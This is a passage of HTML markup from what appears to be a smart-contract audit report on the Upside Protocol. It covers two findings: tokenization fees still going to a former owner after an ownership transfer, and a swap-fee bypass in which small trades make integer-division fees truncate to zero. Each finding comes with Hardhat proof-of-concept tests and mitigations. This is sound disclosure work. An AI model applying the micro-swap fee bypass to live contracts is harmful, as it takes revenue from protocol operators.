class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when ownership of the contract is transferred using the standard \u003ccode\u003eOwnable\u003c/code\u003e pattern (e.g., via \u003ccode\u003etransferOwnership()\u003c/code\u003e), the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call \u003ccode\u003esetFeeInfo\u003c/code\u003e, then fees are still sent to the previous owner.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eOverride the \u003ccode\u003etransferOwnership()\u003c/code\u003e from \u003ccode\u003eOwnable\u003c/code\u003e to check that if the current fee recipient is the owner trying to exit, then it should revert.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    describe(\u0026quot;C4 PoC Test Suite\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        let user1: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       let user2: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        before(async function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            signers = await hhethers.getSigners();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            owner = signers[2];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            user1 = signers[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           user2 = signers[1];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       // the test below goes here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should send fees to original owner\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url1 = \u0026quot;https://openzeppelin.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url2 = \u0026quot;https://cantina.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const liquidityTokenAddress = await liquidityToken.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _feeAmount = hhethers.parseUnits(\u0026quot;5\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Configure fee parameters with current owner as the fee destination\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeEnabled: true,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeStartingBp: 9900,  // 99%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDecayInterval: 6,  // 6 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeFinalBp: 100,      // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeDeployerBp: 1000,  // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      swapFeeSellBp: 100,       // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Owner sets the fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // set tokenize fee to 5e6\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // mint liquidityToken to user1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.mint(await user1.getAddress(), _mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that user1 received the minted tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs tokenization (url1), fee should go to current fee destination (owner)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Validate that the fee was received by the original owner\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;5\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Transfer ownership to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // asset that new ownership is assigned to user2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // user1 performs a second tokenization (url2) after ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // assert that the original owner still receives the fee post-ownership transfer\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits(\u0026quot;10\u0026quot;, 6));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"03-swap-fee-bypass-via-small-trade-amounts\" style=\"position:relative;\"\u003e\u003ca href=\"#03-swap-fee-bypass-via-small-trade-amounts\" aria-label=\"03 swap fee bypass via small trade amounts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[03] Swap fee bypass via small trade amounts\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-1\" aria-label=\"finding description 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eswap()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocolâ€™s fee logic.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isBuy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @dev On buy, the dynamic time fee is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountAfterFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it createsâ€”users could automate micro-swaps to avoid fees entirely while still draining value from the system.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eNo fees are collected on small trade size.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eSet a protocol-wide minimum input amount to reject trades too small to generate fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(_amount \u0026gt;= MIN_SWAP_AMOUNT, \u0026quot;Swap amount too small\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in \u003ccode\u003ePoC.test.ts\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should implement fee exemption for user1 during swap\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up a initial swap fee configuration\u003c/span\u003e\u003c/span\u003e\n\u003cspan 